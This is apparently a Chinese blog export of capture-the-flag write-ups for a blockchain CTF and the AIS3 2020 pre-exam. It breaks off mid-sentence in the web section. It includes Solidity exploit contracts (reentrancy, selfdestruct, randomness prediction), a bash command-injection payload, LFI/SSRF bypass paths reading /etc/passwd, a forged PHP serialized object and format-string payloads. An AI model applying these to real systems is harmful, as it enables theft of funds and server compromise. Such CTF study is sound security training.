onlyOwner SI Token Sale 這題的 purchaseTokens 沒有用 SafeMath，也沒有檢查 _value 要大於 feeAmount 先轉個 0.000001 給合約，這樣 0.000001 - 0.00001 就會 underflow 變成很大的數字，就得到了超多的 token 然後再用 refundTokens 就可以半價把 token 換成 ether 錢錢了 Secure Bank SecureBank 的 withdraw 和 MembersBank 的 withdraw 其中的 _value 參數形態不一樣 他們會被看成是不一樣的函式，所以會有兩個不一樣的型態 withdraw 可以呼叫 而 MembersBank 的 withdraw 沒有檢查是不是本人，所以就直接把 contract creator 的錢領走 Lottery 這題要猜 entropy^entropy2 的值，猜到就可以拿走裡面的錢錢 entropy = blockhash(block.number)，但是我們沒辦法知道這個 block 的 blockhash，因為這個 block 還沒算完 但這樣寫不會有錯誤，只是出來的值會是 0 既然 entropy = 0 那就只剩 entropy2，而 entropy2 是根據 msg.sender 來的 所以我們可以直接算出 _seed 的值 可以直接用 remix 寫個簡單的 smart contract 幫我們算那個值，然後利用 event 來印出那個值 ( 當 print 用 ) 123456789pragma solidity ^0.5.9;contract test { event Log(bytes32 value); function go () public { emit Log(keccak256(abi.encodePacked(msg.sender))); }} 或是直接寫一個攻擊合約，去呼叫 play 函式 記得要先把這個合約加到 authorizedToPlay，如果是 gas 不夠就調高 gas limit 吧 12345678910111213141516pragma solidity ^0.5.9;import &quot;./challenge.sol&quot;;contract hack { function exploit(address payable _target) public payable { Lottery target = Lottery(_target); bytes32 entropy2 = keccak256(abi.encodePacked(this)); uint256 seeds = uint256(entropy2); target.play.value(msg.value)(seeds); msg.sender.transfer(address(this).balance); }} Trust Fund 這題是經典的 reentrant attack 123456789101112131415161718192021222324252627pragma solidity ^0.5.9;contract TrustFund { function withdraw() external {}}contract hack { address target = 0xd297ab1c9653295BdE4f6b2e32574Ac5DD994997; uint count = 10; function () external payable { if (count &gt; 0) { count--; TrustFund trust = TrustFund(target); trust.withdraw(); } } function exploit () public { TrustFund trust = TrustFund(target); trust.withdraw(); } function withdraw () public { msg.sender.transfer(address(this).balance); }} Heads or Tails 這題跟 Lottery 很像，不過用的是上一個 block 的 blockhash 那就寫個攻擊合約去呼叫 play，就可以算出一樣的 entropy 給 0.1 ether 能賺 0.05 ether，所以玩個 20 次就把錢全部撈出來啦 記得要寫 fallback 函式才能接錢進來呀 ( 我這裡卡超久der ) 123456789101112131415161718192021222324pragma solidity ^0.5.9;contract HeadsOrTails { function play(bool _heads) external payable {}}contract hack { address target = 0xf8583ccB9900615e0b8304A16539EBFD96c2B0af; function () external payable {} function exploit () public payable { bytes32 entropy = blockhash(block.number - 1); bool coinFlip = (entropy[0] &amp; '\\x01') == '\\x01'; HeadsOrTails heads = HeadsOrTails(target); for (uint i = 0; i &lt; 20; i++) { heads.play.value(0.1 ether)(coinFlip); } msg.sender.transfer(address(this).balance); }} Record Label 這題的題目很長，主要的邏輯就是你領錢的時候會被 royalties 抽成，manager 會抽成 80 趴的錢錢 所以如果直接呼叫 withdrawFundsAndPayRoyalties 就可以拿到 0.2 ether，royalties 抽走 0.8 ether，這題就解掉了 ( 題目合約 balance = 0 ) 不過正確的解法 ( 我全都要 ) 應該是找出 _manager 的地址，然後呼叫 addRoyaltyReceiver 把 receiverToPercentOfProfit 這個 mapping 中 _manager 的 percent 覆寫成 0 這樣去領錢就不會被抽成了 Slot Machine 這題的題目很短，就一個 fallback 函式 但是第一行限制一次只能匯款 1 szabo ( 0.000001 ether ) 目標是要讓這個合約的 balance 大於等於 5 ether，他就會把所有錢錢都給你 其中一個不透過 fallback 給錢的方法就是用 selfdestruct selfdestruct 就是把合約清除掉，在被清除掉之前，這個合約可以把他的錢錢匯款給一個帳戶，而這個匯款的動作不會經過 fallback 函式 寫一個攻擊合約，並給他 5 ether，讓他自我毀滅，並在毀滅之前把 5 ether 匯款給題目合約 1234567pragma solidity ^0.5.9;contract hack { function exploit () public payable { selfdestruct(address(0x22f616f6b95e23efa8FBBAE44BeeC05890E12A4E)); }} https://f3real.github.io/tag/ethereum.html https://xz.aliyun.com/t/2759","link":"/2019/06/07/security/writeups/blockchain-ctf/"},{"title":"【Writeups】AIS3 pre-exam 2020","text":"這學期修了網路攻防實習，這堂課要用 AIS3 Pre-Exam 當期末考，好喔。 攻擊腳本們在這 Misc Piquero 這題給了一張點字的圖，只要先找到出題者用的 generator 這個，接著就一個一個對照就解出來了。 1AIS3{I_feel_sleepy_Good_Night!!!} Karuego 這題給了一張 png，先用 binwalk --dd=&quot;.*&quot; Karuego.png 拉出一個 zip 檔，這個 zip 檔有加密，原本想用 fcrackzip 之類的爆破工具，但 zsteg -a Karuego.png 下去發現 LSB 有一段文字 The key is : lafire，zip 檔解開裡面有一張 Demon.png 打開就看到 flag 了。 1AIS3{Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?} Soy 這題給了一張 png，是被墨漬污染的 QR Code，我用 https://merricx.github.io/qrazybox/ 把已知的黑點白點都畫了上去就解出來了，因為大部分的 Data 區塊都沒被污染到吧，這個網站上畫 QR Code 的時候記得要畫白點，不要只畫黑點，沒畫的會是未知的灰點，我在這裡卡很久Q 1AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!} Saburo 這題要 nc 60.250.197.227 11001，沒給原始碼，連上去要輸入 flag 給他，他會輸出你幾秒後輸了 12Flag: AHaha, you lose in 24 milliseconds. 猜測是 Side Channel Attack，原始碼猜測大概是 ( 不負責任亂寫 code 如下 ) 1234567891011121314151617181920import timedef compare(real_flag, user_flag): l = len(user_flag) if len(user_flag) &lt; len(real_flag) else len(real_flag) for i in range(len(user_flag)): if user_flag[i] != real_flag[i]: return False return i == len(user_flag) - 1real_flag = 'AIS3{...}'user_flag = input()start = time.clock()win = compare(real_flag, user_flag)end = time.clock()if not win: print(f'Haha, you lose in {end - start} milliseconds.')else: print(f'Oh, you win. QQ') 但是很多人在連線的時候去算 cpu time 會抖的很大力，所以後來 server 應該是改成用模擬的 ( 就比較穩了 )，就是錯了就加個 random 小 noise，對了就加一個大一點的值之類的。 所以每個字都爆搜 0 - 255，然後取最大的就好了，可以每次嘗試都送個十次取平均之類的，或是把 log 記起來，之後如果爆搜所有 byte 都沒有進展的話就，回去找第二高的，會比較穩。 1AIS3{A1r1ght_U_4r3_my_3n3nnies} Shichirou 這題要 nc 60.250.197.227 11000，有給原始碼，給他一個 tar 檔，他幫你解開然後把解開的 guess.txt 跟 local 的 flag.txt 的 sha1 做比較，如果一樣的話就噴 flag。 tar 可以壓縮 symbolic link，自己做一個 symbolic link 指向 flag.txt 就完成了。 12ln -s ../flag.txt guess.txttar -cf test.tar ./ 1AIS3{Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!} Clara 這題給了一個 pcap 檔，一開始啥提示都沒有，後來有說是 Malware 在 monitor 電腦然後傳 encrypted data 給 C&amp;C Server，然後傳了兩次一樣的資料，看了老半天，會發現 tcp 流量裡面有類似 AIS3 的字樣，有兩大包 tcp，一包 10 MB 另一包 27 MB，加密的話大概也只有 xor 比較正常吧，所以複製了一些部分用 xortool 分析，找到 key 是 AIS3{NO}，而且看到 PNG 開頭的字樣和一些 xml 的 meta data，就可以確定假設正確也解對了(汗，既然兩次包的明文是一樣的那就把兩包做 xor 再 xor 上 AIS3{NO} 就得到另一包的 key 是 xSECRETx，接著把整包拿去做 xor 拉出圖片，圖片有好幾 MB 很大，一開始只有拉出一張圖片，某個動漫的圖，又卡了一下後，發現那包前面的部分有類似 header 的東西，他不是 8 的倍數，我一開始是直接不理他，但是猜測後面也有好幾段 header，讓 xor 沒對齊壞掉，所以我就把整段 data 暴力 shift 了幾次拿去 xor，就拉出所有照片了，其中一張有 flag，其他都垃圾，原本不知道有很多張圖片，也不知道 flag 在哪的時候還在開 stegsolve 和 zsteg 在圖片找 flag，浪費很多時間。 他的 packet 是很有秩序沒有亂傳的，header 裡面就是固定傳一個 0xdeadbeeffaceb00c 然後 C&amp;C 把剛剛那段 xor 加密回傳，接著後面檔案名字的大小，和檔案名字，每個都分開傳，每個都自己做 xor cipher，接著就是傳 data，都沒有走歪或是掉進什麼坑的話還是有機會解出來的，我也不常分析 packet 也沒分析過什麼惡意程式，經驗不足所以解很久還要看 hint QQ 1AIS3{T0y_t0Y_C4n_u_f1nd_A_n_yTh1ng_d3h1nb_nn3??} Reverse TsaiBro 這題給了一個 ELF 執行檔還有被加密的 flag 檔，被加密的 flag 檔的一小段大概長下面這樣 發財..發財.......發財....發財.......發財....發財.發財........ 隨便用 ida 看了一下後，加密流程就是把 flag 轉乘 flag // 8 和 flag % 8，然後數字是多少就轉乘多少個點，所以最多 8 個點，上面那段就是 [2, 7, 4, 7, 4, 1, 8]，那解密就反過來組回去就好。 1AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3} Fallen Beat 這題給了一隻 jar 執行檔，跑起來是一個節奏遊戲，要 Full Combo 才能拿到 flag，那直接 JD-GUI 下去看他，關鍵在 PanelEnding.class 裡面，定義了被加密的 flag 陣列，還有後面做 xor 解回 flag 印出來的部分 12345byte[] flag = new byte[] { 89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, Byte.MAX_VALUE, 124, 94, 103, 46, 107, 97, 104 }; 123456if (t == mc) { for (i = 0; i &lt; cache.size(); i++) this.flag[i % this.flag.length] = (byte)(this.flag[i % this.flag.length] ^ ((Integer)cache.get(i)).intValue()); String fff = new String(this.flag); this.text[0].setText(String.format(\"Flag: %s\", new Object[] { fff }));} 這裡的 cache 原本以為是內建的東東，結果不是，追了一下發現在 GameControl.class 有定義，東西是從 songs/gekkou/hell.txt 抓出來的，那就直接照著 xor 就解出來了。 1AIS3{Wow_how_m4ny_h4nds_do_you_h4ve} Stand up!Brain 這題給了一個 ELF 執行檔，隨便看了一下發現他實做了 Brainfuck，然後程式碼在執行檔裡面，拉出來長這樣 1-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;---------------------------------[&gt;[-]&lt;[-]]&gt;[&gt;&gt;----[----&gt;+&lt;]&gt;++.++++++++.++++++++++.&gt;-[-----&gt;+&lt;]&gt;.+[---&gt;++&lt;]&gt;+++.&gt;-[---&gt;+&lt;]&gt;-.[----&gt;+++++&lt;]&gt;-.[--&gt;+&lt;]&gt;---.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+[--&gt;+&lt;]&gt;+.[---&gt;++&lt;]&gt;---.++[-&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;----.[--&gt;+&lt;]&gt;-----.[-&gt;++&lt;]&gt;+.-[----&gt;+++&lt;]&gt;.--------.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.--[-----&gt;+++&lt;]&gt;.+++.[---&gt;+&lt;]&gt;-.-[--&gt;+&lt;]&gt;---.++[---&gt;+++++&lt;]&gt;.++++++++++++++.+++[-&gt;+++++&lt;]&gt;.[-----&gt;+&lt;]&gt;++.&gt;-[-----&gt;+&lt;]&gt;.---[-&gt;++&lt;]&gt;-.++++++.[---&gt;+&lt;]&gt;+++.+++.[-]]]]]]] 人腦跑了一下發現前面一段是在做很多 if 判斷，後面有 . 的部分是印 flag 的部分。 1234567891011121314151617# if (ptr[0] - 67) == 0-------------------------------------------------------------------[&gt;[-]&lt;[-]]&gt;[ # if (ptr[2] - 56) == 0 &gt;--------------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[4] - 55) == 0 &gt;-------------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[6] - 54) == 0 &gt;------------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[8] - 51) == 0 &gt;---------------------------------------------------[&gt;[-]&lt;[-]]&gt; [ # if (ptr[8] - 33) == 0 &gt;---------------------------------[&gt;[-]&lt;[-]]&gt; 所以只要你的輸入要是 C8763! 就會進到後面印 flag 的部分，所以可以直接執行原本的程式輸入 C8763! 跟桐人一起使出星爆氣流斬拿 flag，或是直接忽略前面把後面那段貼到線上的 Brainfuck Compiler 執行一下也可以拿到 flag。 1AIS3{Th1s_1s_br4iNFUCK_bu7_m0r3_ez} Long Island Iced Tea 這題給了一個 ELF 執行檔還有被加密的 flag 檔，被加密的 flag 長這樣 1850a2a4d3fac148269726c5f673176335f6d335f55725f49475f346e645f746831735f31735f6d316e655f746572727974657272795f5f7d0000000000000000 隨便嘗試了一下發現超過 8 個 bytes 之後的都不會變而且直接是明文了，把上面那段從 hex 轉回 bytes 就變成 1\\x85\\n*M?\\xac\\x14\\x82irl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 前面 8 個 bytes 已知 AIS3{ 5 個字了，所以直接爆搜剩下 3 個字。 1AIS3{A!girl_g1v3_m3_Ur_IG_4nd_th1s_1s_m1ne_terryterry__} La vie en rose 這題給了給 PE 的執行檔，原本以為\u001d要逆向 windows 了，打開後看到一堆 python 的函式庫還有 tkinter，發現他是用 PyInstaller 包的，參考 這篇 用官方的 archive_viewer.py 把 pyc 拉出來 ( 其實好像是 pyd 檔才對，好像格式上差了一點 )，在逆 pyc 的時候確定版本很重要，拉出來的 pyc 沒有 magic value header，可以隨便再撈個比如 pyimod01_os_path 出來，這個就有 magic value 是 550d 0d0a，所以是 Python 3.8 b4 版，先嘗試用了一下 uncompyle6 去還原原始碼，可是他噴錯然後失敗了，那我們就直接看 bytecode 吧，用 marshal.loads 載入為 code object 再用 dis.dis 去 disassemble，邊猜他的原始碼，可以邊用 dis.dis(compile('x = 1', 'filename', 'exec')) 去驗證，看了一下會發現 1flag = \"\".join(map(chr, [secret[i] ^ notes[i % len(notes)] for i in range(len(secret))])) flag 是用 secret 和 notes xor 出來的，secret 是寫死的，notes 是從 input 輸入進來的，然後做了下面的計算算出 result 12345notes = list(map(ord, notes))for i in range(len(notes) - 1): result.append(notes[i] + notes[i+1])for i in range(len(notes) - 1): result.append(notes[i] - notes[i+1]) 最後把 result 跟一個固定的陣列做比較，所以我們有 a+b 和 a-b 只要把兩個加起來除以二就拿到 a 了，把 notes 還原再跟 secret xor 就得到 flag 了。 1AIS3{th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan} Uroboros 這題給了一個 ELF 執行檔，是 C++ 寫的，總之就逆他，發現他是一個 circular double linked list，結構就像下面這樣很普通。 12345struct Node { struct Node* prev; struct Node* next; int data;}; 總共有 314 個 Node，對輸入的每個字，他會先往下走 輸入的字乘上 7 次然後把走到的那個 Node 的值乘 64 加上 counter，counter 就是一開始是 1，每經過一個字加一，最後把整段輸出跟某個答案比較，對了就代表你的輸入就是 flag，所以就照著解回來，把數字當成 64 進位拆開，比如第 141 個 Node 存的 70 拆成 64 * 1 + 6，代表第一個和第六個字是 ‘A’，因為 ord('A') * 7 = 141 ( mod 341 )，就是把 141 * inverse(7, 341) = 65 = ord('A')，就這樣。 1AIS3{4ll_humonculus_h4v3_a_ur0b0r0s_m4rk_0n_the1r_b0dy} Pwn BOF 最簡單的 buffer overflow，裡面已經有一個函式，直接呼叫就拿到 shell 了，但是記得要跳到 push rbp 下一行，如果跳到 push rbp 的話 stack 會沒有對齊 16 的倍數，做 system 的時候會進到 child thread 然後跑到 movaps XMMWORD PTR [rsp+0x40], xmm0 因為沒對齊就掛了，然後 child thread 死掉 system 就會執行完跳出來 ( 都還沒打到指令 )，出來跑到函式結尾 return 的時候又會掛掉，因為正常呼叫函式都會把 return address 放到 stack 上，但是直接跳過去就沒有放，他就會 return 到奇怪的位置。 1AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt} Nonsense 這題讓我們輸入 shellcode，然後會檢查 shellcode 裡面有沒有 wubbalubbadubdub 這段字，並且在這段字前面的每個字都要小於等於 31，而找到那段字之後就會直接跳出檢查函式，所以那段字的後面都不會被檢查了，那我們的 shellcode 就構造成最開頭先 ja 跳到後面真正的 shellcode，然後中間放 wubbalubbadubdub，就完成了。 12345ja shellcode... (some padding instructions)wubbalubbadubdubshellcode:... 1AIS3{Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!} Portal Gun 這題就是用 gets 的 bof，有一個函式有用到 system('sh')，但是他有 LD_PRELOAD 一個 hook.so 裡面把 system hook 掉了，所以不能直接叫，那就堆 ROP leak libc address 再自己跳進去 system 吧。 1AIS3{U5E_Port@L_6uN_7o_GET_tHe_$h3L1_0_o} Morty School 這題一開始就給你 leak libc address 給你，接下來你可以挑一個 Morty 教，但你給的 index 他沒有檢查，所以可以任意寫一個位址，但是不是直接寫值上去，而是寫到你給他的位址裡面放的位址裡面的值，所以找一下哪裡有存 __stack_chk_fail got 的位址，利用他去寫 __stack_chk_fail 的 got 改成我們串好的 ROP gadgets，然後寫爆 stack（ 因為這裡也有 overflow ），就跳去做 ROP 了，一開始有想直接跳 one gadgets 但是條件都不符，所以就自己做 ROP 做 system('/bin/sh')。 1AIS3{s7ay_At_h0ME_And_Keep_$Oc1@L_D1$T4Nc3,M0rTyS} Death Crystal 這題是 format string，但是有檢查輸入，所有字都不能有 $, \\, /, ^，並且 % 後面都不能有 c, p, n, h，主要是不能用 $ 去指定參數，但沒關係就多放幾個 padding 用的把參數推過去就好了，他的 flag 已經讀進來放到 0x202060 了，但是 PIE 有開所以還是要 leak 一下 code base address，要繞過檢查只要前面隨便放個數字就好了，比如 %1p，先 b'%1p' * 11 + b';%1p' leak 出 code base address，然後再 b'%d' * 8 + b'%100sAA\\x00' + p64(base + 0x202060) 就拿到 flag 了。 1AIS3{FOrM@T_5TRin6_15_$o0o_pOw3rFul_And_eAsY} Meeseeks Box 這題是 heap 題，很一般的有 create, show, delete 的題目，然後沒什麼檢查，而且是 ubuntu 18.04 有 tcache 可以用，所以先弄個夠大的 chunk 然後 free 掉他讓他進到 unsorted bins 就可以拿 libc address 了，然後有 tcache 可以隨便 double free 他去把 __malloc_hook 寫成 one gadget 的位址就完成了。 1AIS3{G0D_d4mn!_Mr._M3e5EEk5_g1V3S_Y0U_@_sH31l} Crypto Brontosaurus 給了一個檔案叫 KcufsJ 裡面是 jsfuck 混淆過的 js code，他的檔名就是倒過來的 jsfuck，所以內容也要倒過來，開瀏覽器 console 執行一下就好了。 1AIS3{Br0n7Os4uru5_ch3at_3asi1Y} T-Rex 123456789101112131415 ! @ # $ % &amp; ! V F Y J 6 1 @ 5 0 M 2 9 L # I W H S 4 Q $ K G B X T A % E 3 C 7 P N &amp; U Z 8 R D O&amp;$ !# $# @% { %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## ! # &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $% ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @ @ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;# &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# % &amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ } 給了一張表和密文，對表轉回去就好了，但要注意 row 和 column 的順序，&amp;$ 是 A 不是 R。 Octopus 這題給 python script 和他執行後的 output，裡面在做 BB84 量子密鑰分發，兩邊的 Basis 都給了，Qubits 也給了，就是把 Basis 一樣部分的那些 Qubits 抓出來轉回 binary 就好了。 1AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84} Blowfish 這題要 nc 60.250.197.227 12001，有給原始碼，還有一個 python pickle dump 的檔案 1[{'name': 'maojui', 'password': 'SECRET', 'admin': False}, {'name': 'djosix', 'password': 'S3crE7', 'admin': False}, {'name': 'kaibro', 'password': 'GGInIn', 'admin': False}, {'name': 'others', 'password': '_FLAG_', 'admin': False}] 連上去之後，他會給你這段用 Blowfish 的 CTR Mode 加密的結果當作 token，接著你就可以再把 token 丟回去給他解密，他會看你是不是 admin，因為是 CTR Mode 所以就翻一下 bit 就好了，把那個 False 的部分翻成 True，就這麼簡單。 詳情可以參考 這份投影片 Bit-Flipping Attack 的部分。 1AIS3{ATk_BloWf1sH-CTR_by_b1t_Flipping_^_^} Camel 這題給了 sage script，裡面有一個 Elliptic Curve，並給了上面的 9 個點，flag 就是 Elliptic Curve 的參數，因為他給的點的 x 座標都是 $p-1, p+1, p+2, …$，所以帶進 $y^2 = x^3 + a x + b$ 式子 mod p 之後 p 就都不見了 $$ \\begin{align} &amp;(p-1)^3 + a (p-1) + b = -1 - a + b \\pmod{p} \\\\ &amp;(p+1)^3 + a (p+1) + b = 1 + a + b \\pmod{p} \\end{align} $$ 上面兩式相加之後可以得到 2b，還有其他兩組 p+3, p-3, p+5, p-5 也是同樣的情況，所以我們可以拿到三組 2b + kp 這樣形式的東西，把他們互減去做 gcd 就得到 p 了，有 p 之後就帶回去就可以得到 a, b。 1AIS3{Curv3_Mak3_M3_Th1nK_Ab0Ut_CaME1_A_P} Turtle 這題就是 Padding Oracle Attack，我把以前的 script 拿出來然後把 oracle 換成用 requests 去抓就完成了。 詳情可以參考 這份投影片 Padding Oracle Attack 的部分。 1AIS3{5l0w_4nd_5734dy_w1n5_7h3_r4c3.} Web Squirrel 這題網站在 https://squirrel.ais3.org/，打開看一下流量會看到有一個請求是 /api.php?get=/etc/passwd，看起來是直接給你 local file inclusion，抓一下網站原始碼 /api.php?get=/var/www/html/api.php 123456789101112131415161718192021&lt;?phpheader('Content-Type: application\\/json');if ($file = @$_GET['get']) { $output = shell_exec(\"cat '$file'\"); if ($output !== null) { echo json_encode([ 'output' =&gt; $output ]); } else { echo json_encode([ 'error' =&gt; 'cannot get file' ]); }} else { echo json_encode([ 'error' =&gt; 'empty file path' ]);} 看起來是 command injection，/api.php?get='|bash -c 'ls 就可以執行任意 command 了，ls / 看根目錄有個 5qu1rr3l_15_4_k1nd_0f_b16_r47.txt 裡面就是 flag 了 ( 剛好檔名跟 flag 一樣，真佛心 ) 1AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47} Shark 這題網站在 https://shark.ais3.org/，首頁有個連結點下去就是 /?path=hint.txt，又是 local file inclusion，但是 hint 說 123Please find the other server in the internal network! (flag is on that server) GET http://some-internal-server/flag 那就先看一下原始碼 /?path=/var/www/html/index.php，直接看會拿到 [forbidden]，那隨便繞一下 /?path=file:///var/www/html/index.php 1234567891011121314151617181920&lt;?php if ($path = @$_GET['path']) { if (preg_match('/^(\\.|\\/)/', $path)) { // disallow /path/like/this and ../this die('&lt;pre&gt;[forbidden]&lt;/pre&gt;'); } $content = @file_get_contents($path, FALSE, NULL, 0, 1000); die('&lt;pre&gt;' . ($content ? htmlentities($content) : '[empty]') . '&lt;/pre&gt;'); }?&gt;&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;title&gt;🦈🦈🦈&lt;/title&gt; &lt;meta charset=\"utf-8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;🦈🦈🦈&lt;/h1&gt; &lt;a href=\"?path=hint.txt\"&gt;Shark never cries?&lt;/a&gt;&lt;/body&gt; 有用 regex 檢查開頭不能是 . 和 /，所以 file:// 或 php://filter/read=convert.base64-encode/resource= 都可以繞，再來看 /?path=file:///etc/hosts 1234567127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.22.0.3 02b23467485e 瀏覽一下 /?path=http://02b23467485e 發現是本機，那就找找子網路下的鄰居們，就找到 /?path=http://172.22.0.2/flag 1AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5} Elephant 這題網站在 https://elephant.ais3.org/，首頁可以登入，隨便輸入個 username 就登入了不需要密碼，第一步當然是找找有沒有原始碼，看了一下 robots.txt 沒東西，再看 .git 是 Forbidden，中獎，隨便找個 GitDumper 把 .git 抓下來，git log 看到前一個 commit 把原始碼刪掉了，git reset --hard 回去，原始碼如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;?phpconst SESSION = 'elephant_user';$flag = file_get_contents('/flag');class User { public $name; private $token; function __construct($name) { $this-&gt;name = $name; $this-&gt;token = md5($_SERVER['REMOTE_ADDR'] . rand()); } function canReadFlag() { return strcmp($flag, $this-&gt;token) == 0; }}if (isset($_GET['logout'])) { header('Location: /'); setcookie(SESSION, NULL, 0); exit;}$user = NULL;if ($name = $_POST['name']) { $user = new User($name); header('Location: /'); setcookie(SESSION, base64_encode(serialize($user)), time() + 600); exit;} else if ($data = @$_COOKIE[SESSION]) { $user = unserialize(base64_decode($data));}?&gt;&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;title&gt;Elephant&lt;/title&gt; &lt;meta charset='utf-8'&gt; &lt;link href=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" rel=\"stylesheet\" id=\"bootstrap-css\"&gt; &lt;script src=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;script src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;?php if (!$user): ?&gt; &lt;div id=\"login\"&gt; &lt;h3 class=\"text-center text-white pt-5\"&gt;Are you familiar with PHP?&lt;/h3&gt; &lt;div class=\"container\"&gt; &lt;div id=\"login-row\" class=\"row justify-content-center align-items-center\"&gt; &lt;div id=\"login-column\" class=\"col-md-6\"&gt; &lt;div id=\"login-box\" class=\"col-md-12\"&gt; &lt;form id=\"login-form\" class=\"form\" action=\"\" method=\"post\"&gt; &lt;h3 class=\"text-center text-info\"&gt;What's your name!?&lt;/h3&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"name\" class=\"text-info\"&gt;Name:&lt;/label&gt;&lt;br&gt; &lt;input type=\"text\" name=\"name\" id=\"name\" class=\"form-control\"&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;input type=\"submit\" name=\"submit\" class=\"btn btn-info btn-md\" value=\"let me in\"&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php else: ?&gt; &lt;h3 class=\"text-center text-white pt-5\"&gt;You may want to read the source code.&lt;/h3&gt; &lt;div class=\"container\" style=\"text-align: center\"&gt; &lt;img src=\"images/elephant2.png\"&gt; &lt;/div&gt; &lt;hr&gt; &lt;div class=\"container\"&gt; &lt;div class=\"row justify-content-center align-items-center\"&gt; &lt;div class=\"col-md-6\"&gt; &lt;div class=\"col-md-12\"&gt; &lt;h3 class=\"text-center text-info\"&gt;Do you know?&lt;/h3&gt; &lt;h3 class=\"text-center text-info\"&gt;PHP's mascot is an elephant!&lt;/h3&gt; Hello, &lt;b&gt;&lt;?= $user-&gt;name ?&gt;&lt;/b&gt;! &lt;?php if ($user-&gt;canReadFlag()): ?&gt; This is your flag: &lt;b&gt;&lt;?= $flag ?&gt;&lt;/b&gt; &lt;?php else: ?&gt; Your token is not sufficient to read the flag! &lt;?php endif; ?&gt; &lt;a href=\"?logout\"&gt;Logout!&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php endif ?&gt;&lt;/body&gt; 只要讓 strcmp($flag, $this-&gt;token) == 0 就好啦，那 strcmp 已知的問題就是他 compare 陣列隨然會噴 Warning，但結果會是 NULL，而這裡是用兩個 = 不是三個，所以 NULL == 0，把下面這段 base64 encode 後放回 Cookie 就完成啦。 1O:4:&quot;User&quot;:2:{s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:11:&quot;\\x00User\\x00token&quot;;a:0:{}} 1AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry} Snake 這題網站在 https://snake.ais3.org/ ，首頁就是原始碼了 123456789101112131415161718192021222324from flask import Flask, Response, requestimport pickle, base64, tracebackResponse.default_mimetype = 'text/plain'app = Flask(__name__)@app.route(\"/\")def index(): data = request.values.get('data') if data is not None: try: data = base64.b64decode(data) data = pickle.loads(data) if data and not data: return open('/flag').read() return str(data) except: return traceback.format_exc() return open(__file__).read() 給他 data，他會 